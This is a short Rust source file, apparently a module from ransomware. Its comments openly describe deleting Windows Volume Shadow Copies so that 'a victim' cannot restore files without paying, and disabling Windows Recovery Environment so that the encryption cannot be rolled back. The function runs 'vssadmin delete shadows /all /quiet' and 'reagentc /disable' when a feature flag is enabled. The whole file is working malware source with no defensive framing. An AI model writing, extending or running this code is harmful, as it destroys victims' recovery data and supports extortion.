//! Optional deletion of Windows Volume Shadow Copies (opt-in via the
//! `vss-delete` cargo feature).
//!
//! Volume Shadow Copies let a victim restore their files without paying, so
//! the run deletes them up front. It also disables Windows Recovery
//! Environment (`reagentc /disable`) so a factory restore can't be used to
//! roll the encryption back. Off by default: [`delete_shadow_copies`] then
//! does nothing and the run behaves exactly as before.

/// Delete all local Volume Shadow Copies and disable WinRE.
///
/// Best-effort: requires an elevated shell, so on a non-admin run it simply
/// fails and the encryption continues. No-op unless the `vss-delete` feature
/// is enabled on Windows.
pub fn delete_shadow_copies() {
    #[cfg(all(windows, feature = "vss-delete"))]
    {
        let _ = std::process::Command::new("vssadmin")
            .args(["delete", "shadows", "/all", "/quiet"])
            .status();
        let _ = std::process::Command::new("reagentc").arg("/disable").status();
    }
}
